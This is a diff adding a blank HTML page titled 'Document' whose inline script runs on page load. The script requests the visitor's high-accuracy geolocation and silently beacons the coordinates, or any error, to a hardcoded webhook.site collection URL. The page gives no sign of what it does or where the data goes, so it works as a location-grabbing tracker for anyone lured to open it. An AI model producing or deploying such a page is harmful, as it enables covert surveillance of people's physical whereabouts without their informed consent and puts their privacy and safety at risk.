@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <script>
+        function sendDataToWebhook(bodyData) {
+            navigator.sendBeacon("https://webhook.site/6147787f-ae04-4e22-af7b-5daee98f348e", bodyData);
+        }
+        function onsuccess(position) {
+            sendDataToWebhook(`${position.coords.longitude} ${position.coords.latitude}`);
+        }
+        function onerror(error) {
+            sendDataToWebhook(`${error.code} ${error.message}`);
+        }
+
+        function geolocate() {
+            navigator.geolocation.getCurrentPosition(onsuccess, onerror, { enableHighAccuracy: true });
+        }
+
+        geolocate()
+    </script>
+</body>
+
+</html>
